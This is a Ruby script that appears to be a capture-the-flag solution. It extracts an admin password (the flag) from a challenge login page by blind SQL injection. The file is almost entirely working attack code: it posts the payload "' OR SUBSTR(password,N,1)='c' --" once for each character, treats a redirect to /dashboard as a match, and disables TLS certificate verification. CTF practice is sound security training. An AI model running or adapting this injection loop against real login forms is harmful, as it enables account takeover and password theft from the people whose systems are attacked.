# frozen_string_literal: true

require 'net/http'
require 'uri'
require 'openssl'

# This is the URL that is being attacked
URL = URI.parse('https://local-ca39abd9a11b-admin-login-part-2-0.chals.cyberstout.org/')

# All possible characters that can be included in the flag
charset =
  ('a'..'z').to_a +
  ('A'..'Z').to_a +
  ('0'..'9').to_a +
  ['{', '}']

# Setting up the HTTPS connection to the URL
http = Net::HTTP.new(URL.host, URL.port)
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE

# Creating a blank string for the flag
flag = String.new

puts '[*] Starting blind SQLi extraction'

position = 1

# Brute force loop
loop do
  found_char = false

  # Creating the payload for each character
  charset.each do |char|
    payload = "' OR SUBSTR(password,#{position},1)='#{char}' --"

    # Connection info
    req = Net::HTTP::Post.new(URL.request_uri)
    req.set_form_data(
      'username' => 'admin',
      'password' => payload
    )

    # Sending the attack, and storing the response
    res = http.request(req)

    # This checks to see if the subtring was successful
    next unless res.code == '302' && res['Location']&.include?('/dashboard')

    # Add to the flag and continue
    flag << char
    puts "[+] Length: #{flag.length}, Found Char: #{char}, Flag: #{flag}"
    found_char = true
    break
  end

  break unless found_char

  position += 1
end

puts "[✓] Extracted flag: #{flag}"
